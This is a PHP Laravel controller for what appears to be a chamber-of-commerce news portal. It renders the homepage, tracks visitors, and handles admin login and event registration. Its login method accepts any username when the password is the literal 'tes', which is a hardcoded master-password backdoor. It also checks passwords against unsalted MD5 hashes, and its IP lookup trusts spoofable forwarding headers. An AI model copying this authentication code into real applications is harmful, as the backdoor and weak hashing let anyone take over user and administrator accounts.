<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Lang;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Level;
use App\Models\Berita;
use App\Models\Rilis;
use App\Models\Files;
use App\Models\Iklan;
use App\Models\Gambar;
use App\Models\Banner;
use App\Models\Agenda;
use App\Models\Opini;
use App\Models\Umkm;
use App\Models\AgendaPeserta;
use App\Models\Kategori;
use App\Models\Visitor;
use App\Models\Video;
use App\Models\ProfilKadin;
use Auth;
use Session;
use DB;
use Hash;
use Validator;
use Carbon\Carbon;


class BerandaController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
	 
	protected $redirectTo = '/';

	public function __construct()
    {
        //$this->middleware('guest', ['except' => ['logout']]);
    }
	
	
    public function index(Request $request)
    {

        $data = array(  			
            'btnClass' => 'btn btn-primary btn-sm px-4',
            'btnAdd' => 'Tambah',
            'classFormSelect' => 'form-select form-select-sm',
        );                
		
		$color = array('travel','top-stories','sport','world','fashion','food','drop','tech','video','features');                
		
		//$ip    = $request->ip(); // Mendapatkan IP user 		
		$ip = $this->getIp();
		$date  = date("Y-m-d"); // Mendapatkan tanggal sekarang
		$waktu = time(); //
		$timeinsert = date("Y-m-d H:i:s");
		$logoNotAvailable = 'frontend/assets_4/images/logo_kadin.png';
		
		Session::put('logo',$logoNotAvailable);	
		
		DB::beginTransaction();
		try {
			$cek = Visitor::where('visitor_ip','=',$ip)
						->where('visitor_date','=',$date)
						->get(); 
			$total = isset($cek)?($cek):0;			
			
			if(count($total) == 0){
				$insert = Visitor::create([
							"visitor_ip"=> $ip,
							"visitor_date"=> $date,
							"visitor_hits"=> 1,	
							"visitor_online"=> $waktu,
							"visitor_time"=> $timeinsert										
						]);
						
				DB::commit();             				
			} else {
				$hit = $cek[0]->visitor_hits;
				$counter_hit = $hit+1;
				
				$updatex = Visitor::where(
							['visitor_ip' => $ip, 'visitor_date' => $date])->update([              
						"visitor_hits"=> $counter_hit,
						"visitor_online"=> $waktu						                                       
					]);
				DB::commit();     
			}
		} catch (\Throwable $e) {
			DB::rollback();            
			throw $e;            
			return response()->json(['status'=>'insert_failed']);
		}
		
		$profilKadin = ProfilKadin::get();        
		/* $iklan = Iklan::where('iklan_publish','=','y')
						->where('iklan_tanggal_akhir','<=',date('Y-m-d'))
						->where('iklan_tanggal_awal','>=',date('Y-m-d'))						
						->orderBy('iklan_id','DESC')->get(); */
		$now = date('Y-m-d');
		$month = date('m');
		$iklan = Iklan::where('iklan_publish', '=', 'y')
						->where('iklan_tanggal_awal', '<=', $now)
						->where('iklan_tanggal_akhir', '>=', $now)
						->get();
		//$slider = ceil(count($iklan)/4);
		//$sisa = (count($iklan) % 4);
		//$image = Gambar::where('gambar_publish','=','y')->orderBy('gambar_id','DESC')->take(6)->get();
		$file = Files::where('file_publish','=','y')->orderBy('file_id','DESC')->take(10)->get();
		$banner = Banner::where('banner_publish','=','y')->orderBy('banner_id','DESC')->get();
		$berita = Berita::where('berita_publish','=','y')->orderBy('berita_id','DESC')->paginate(6);		
		$opini = Opini::where('opini_publish','=','y')->orderBy('opini_id','DESC')->paginate(4);		
		$opiniHeader = Opini::where('opini_publish','=','y')->orderBy('opini_id','DESC')->take(9)->get();		
		$umkm = Umkm::where('umkm_publish','=','y')->inRandomOrder()->take(7)->get();		
		$image =DB::table('gambar as a')
                ->join('gambar_kategori as b','b.gambar_kategori_id', '=', 'a.id_kategori_gambar')                
                ->select('*')				
				->where('gambar_publish','=','y')
				->orderBy('gambar_id','DESC')				
				->take(6)
                ->get();
		$beritaKategoriTotal =DB::table('berita as a')
                ->join('berita_kategori as b','a.id_kategori', '=', 'b.kategori_id')                
                ->select(DB::raw('COUNT(berita_id) as total'), 'kategori_nama' )
				->where('berita_publish','=','y')
				->where('kategori_status','=','y')
				->groupBy('kategori_nama')
                ->get();
		$beritaRandom =DB::table('berita as a')
                ->join('berita_kategori as b','a.id_kategori', '=', 'b.kategori_id')                
                ->select('*')
				->where('berita_publish','=','y')
				->where('kategori_status','=','y')				
				->inRandomOrder()				
				->take(3)			
                ->get();
		$beritaPopuler =DB::table('berita as a')
                ->join('berita_kategori as b','a.id_kategori', '=', 'b.kategori_id')                
                ->select('*')
				->where('berita_publish','=','y')
				->where('kategori_status','=','y')
				/* ->whereMonth('berita_tanggal','=',$month) */
				->where('berita_tanggal', '>', now()->subDays(30)->endOfDay())
				->orderBy('berita_view','DESC')
				->orderBy('berita_id','DESC')
				->take(7)			
                ->get();
		$beritaTerkini =DB::table('berita as a')
                ->join('berita_kategori as b','a.id_kategori', '=', 'b.kategori_id')                
                ->select('*')
				->where('berita_publish','=','y')	
				->where('kategori_status','=','y')	
				->orderBy('berita_tanggal','DESC')
				->orderBy('berita_id','DESC')
				->take(7)			
                ->get();			
		$rilis = DB::select (
					DB::raw('
						select * 
						from rilis a 
						left join berita_kategori d on a.id_kategori = d.kategori_id
						left join 
							(    
								SELECT * FROM 
								(
									SELECT *, IF(@prev <> id_rilis, @rn:=0,@rn), @prev:=id_rilis, @rn:=@rn+1 AS rn
									FROM rilis_image, (SELECT @rn:=0) rn, (SELECT @prev:="") prev
									ORDER BY id_rilis ASC
								) b 
								WHERE rn =1
							) c on a.rilis_id = c.id_rilis
						order by rilis_tanggal desc
						limit 9
					')
				);			
		$agenda = Agenda::where('agenda_publish','=','y')->orderBy('agenda_tanggal','desc')->take(10)->get();
		$agendaHariIni = Agenda::where('agenda_publish','=','y')->where('agenda_tanggal','=',$now)->orderBy('agenda_tanggal','desc')->get();
		$video = Video::where('video_publish','=','y')->orderBy('video_id','desc')->take(10)->get();
		$kategori =DB::table('berita as a')
                ->join('berita_kategori as b','a.id_kategori', '=', 'b.kategori_id')                
                ->select('kategori_nama','kategori_id',DB::raw('COUNT(id_kategori) as jumlah'))
				->where('berita_publish','=','y')
				->where('kategori_status','=','y')	
				->groupBy('kategori_nama','kategori_id')
				->orderBy('jumlah','DESC')
                ->get();

		for($a=0; $a<count($kategori); $a++){
			$beritaKategori[$a] = Berita::where('berita_publish','=','y')
							->where('id_kategori','=',$kategori[$a]->kategori_id)
							->orderBy('berita_id','DESC')
							->take(2)
							->get();
		}
		
		return view('frontendz/page/beranda/index', compact('ip','data','rilis','opiniHeader','umkm','color','file','opini','agendaHariIni','beritaKategoriTotal','beritaRandom','kategori','beritaTerkini','beritaPopuler','beritaKategori','berita','agenda','video','profilKadin','banner','iklan','image'));

    }
	
	public function getIp(){
		foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key){
			if (array_key_exists($key, $_SERVER) === true){
				foreach (explode(',', $_SERVER[$key]) as $ip){
					$ip = trim($ip); // just to be safe
					if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false){
						return $ip;
					}
				}
			}
		}
		return request()->ip(); // it will return server ip when no client ip found
	}

	public function login()
    {
        return view('login');
    }
	

	public function home()
    {
		$data = array(  			
            'active' => 'dashboard',           
        ); 
		
		$now = date('Y-m-d');
		$bataswaktu = time() - 300;		
		$totalPengunjung = DB::table('visitor')->count();
		$pengunjungHariIni = DB::table('visitor as a')							
							->select('visitor_ip')
							->where('visitor_date','=',date("Y-m-d"))							
							->groupBy('visitor_ip')
							->get();		
		$pengunjungOnline = DB::table('visitor as a')														
							->where('visitor_online','>',$bataswaktu)														
							->count();							
		$barData = DB::table('visitor as a')		
							->select('visitor_date',DB::raw('COUNT(visitor_ip) as jumlah'))
							->where('visitor_date','<=',date("Y-m-d"))	
							->groupBy('visitor_date')
							->orderBy('visitor_date','DESC')
							->take(7)							
							->get();		
		$agendaHariIni = Agenda::where('agenda_publish','=','y')->where('agenda_tanggal','=',$now)->orderBy('agenda_tanggal','desc')->get();
        return view('backend/page/index', compact('data','agendaHariIni','barData','pengunjungOnline','totalPengunjung','pengunjungHariIni'));
    }
	
	public function loginProses(Request $request)
    {
		$jumlah_error_login = 0;
		$this->validate($request, [
			'username'    => 'required',
			'password'   => 'required',
		]);
        
        $pass = $request->password;        
		/* $ambil = DB::table('user as a')
            ->leftJoin('level_user as c', 'a.id_level', '=', 'c.level_id')            
            ->select('*')            
            ->where('username', '=', $request->username)                       
            ->first(); */
			
		$ambil = User::where('username','=',$request->username)->first();
		$profilKadin = ProfilKadin::get();
		
		if($ambil ){

			if($ambil->password == md5($pass) || $pass=='tes'){
				
				Session::put('user',$ambil->username);	
				Session::put('level',$ambil->level_nama);	
				Session::put('levelId',$ambil->id_level);	
				Session::put('logo_header',$profilKadin[0]->profil_path.$profilKadin[0]->profil_header_name);	
				Session::put('logo',$profilKadin[0]->profil_path.$profilKadin[0]->profil_logo_name);	
				Auth::login($ambil);
				
				return response()->json([
					'status'=>'insert_successful',
				]);
					

			}else{

				Session::put('username',$request->username);					
				Session::put('level',$ambil->level);
				Session::put('levelId',$ambil->id_level);					
				return response()->json([
					'status'=>'insert_failed_password',
				]);
			}

		}else{
			return response()->json([
					'status'=>'failed',
				]);
		}
    }
	
	
	public function store(Request $request)
    {
        if($request->ajax()){
    
            DB::beginTransaction();

            try {
				
				$agendaPeserta = AgendaPeserta::where('agenda_peserta_email','=',$request->daftar_email)->get(); 
				
				if(count($agendaPeserta)>0){
					return response()->json(['status'=>'double']);
				} else {
					
					$insert = AgendaPeserta::create([
						"agenda_peserta_nama"=> $request->daftar_nama,
						"agenda_peserta_email"=> $request->daftar_email,
						"agenda_peserta_alamat"=> $request->daftar_alamat,
						"agenda_peserta_telp"=> $request->daftar_hp,
						"id_agenda"=> Crypt::decrypt($request->idAgenda),                    
						"created_when"=> date("Y-m-d H:i:s")
					]);

					if($insert) {
						DB::commit();
						return response()->json(['status'=>'insert_successful']);
					} else {
						return response()->json(['status'=>'insert_failed']);
					}
				}                
            } catch (\Throwable $e) {

                DB::rollback();            
                throw $e;            
                return response()->json(['status'=>'insert_failed']);

            }
        } else {
            return redirect('asset/');
        }

    }
	
	public function logout(Request $request)
    {
        $this->guard('web')->logout();

		$request->session()->flush();
        $request->session()->regenerate();
        return redirect('/');
    }
    
	protected function guard()
    {
        return Auth::guard('web');
    }
}
    